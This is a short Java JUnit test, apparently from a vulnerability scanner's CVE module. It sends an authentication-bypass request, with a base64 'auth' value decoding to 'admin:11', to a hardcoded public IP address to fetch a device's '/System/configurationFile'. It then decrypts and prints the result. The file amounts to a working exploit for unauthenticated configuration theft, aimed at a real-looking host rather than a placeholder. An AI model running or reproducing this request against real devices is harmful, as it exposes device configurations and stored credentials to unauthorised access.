import okhttp3.Response;
import org.junit.Ignore;
import org.junit.Test;
import scanner.runner.unlock.cve.ConfigurationDecrypt;
import scanner.http.HttpClient;

import java.io.InputStream;

public class ConfigurationDecryptFuncTest {

    @Test
    @Ignore("Functionality checking test")
    public void test_decrypt() {
        Response response = HttpClient.doGet("http://83.66.117.135/System/configurationFile?auth=YWRtaW46MTEK");
        InputStream inputStream = response.body().byteStream();
        System.out.println(ConfigurationDecrypt.decrypt(inputStream));
    }

}